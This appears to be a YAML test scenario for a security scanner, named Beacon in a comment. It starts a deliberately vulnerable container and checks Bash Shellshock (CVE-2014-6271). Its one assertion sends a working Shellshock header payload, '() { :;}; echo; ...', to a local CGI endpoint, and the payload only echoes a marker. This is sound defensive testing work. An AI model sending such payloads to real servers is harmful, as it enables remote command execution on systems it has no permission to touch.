name: cmdinj-shellshock
description: "Bash Shellshock (CVE-2014-6271) — real command injection in existing vulnerable container"
tags: [cmdinj, scanner, web, cve]

services:
  vuln-app:
    image: vulnerables/cve-2014-6271
    ports: ["9211:80"]

ready:
  cmd: "curl -sf http://localhost:9211/ >/dev/null"
  timeout: 60s
  interval: 3s

assertions:
  - name: exploit-shellshock-command-injection
    type: command
    expect:
      command: "curl -s -H 'User-Agent: () { :;}; echo; echo shellshock-rce-confirmed' http://localhost:9211/cgi-bin/vulnerable | grep -q 'shellshock-rce-confirmed'"
      exit_code: 0

  # Beacon's cmdinj scanner uses timing-based detection on query parameters
  # (?cmd=, ?host=). Shellshock injects via HTTP headers, a different vector.
  # Scanner detection logic is verified by unit tests in cmdinj/scanner_test.go.

timeout: 5m
